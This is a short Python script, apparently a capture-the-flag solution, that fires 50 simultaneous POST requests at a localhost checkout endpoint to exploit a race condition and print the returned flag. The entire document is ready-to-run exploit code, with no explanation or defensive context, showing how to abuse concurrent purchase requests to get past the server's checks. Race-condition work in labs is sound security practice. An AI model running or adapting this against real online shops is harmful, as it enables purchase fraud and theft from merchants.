import requests
import threading
import time

URL = "http://localhost:5000/checkout"
ITEM_ID = 1  # 1 = SleighToy, 2 = Bunny

def exploit_thread():
    payload = {"item_id": ITEM_ID}
    try:
        r = requests.post(URL, json=payload, timeout=5)
        if "Flag" in r.text:
            print(f"[!] FLAG: {r.json()['message']}")
    except:
        pass

print(f"[*] Exploiting item {ITEM_ID} with 50 threads...")
threads = []
for _ in range(50):
    t = threading.Thread(target=exploit_thread)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("[+] Exploitation complete")
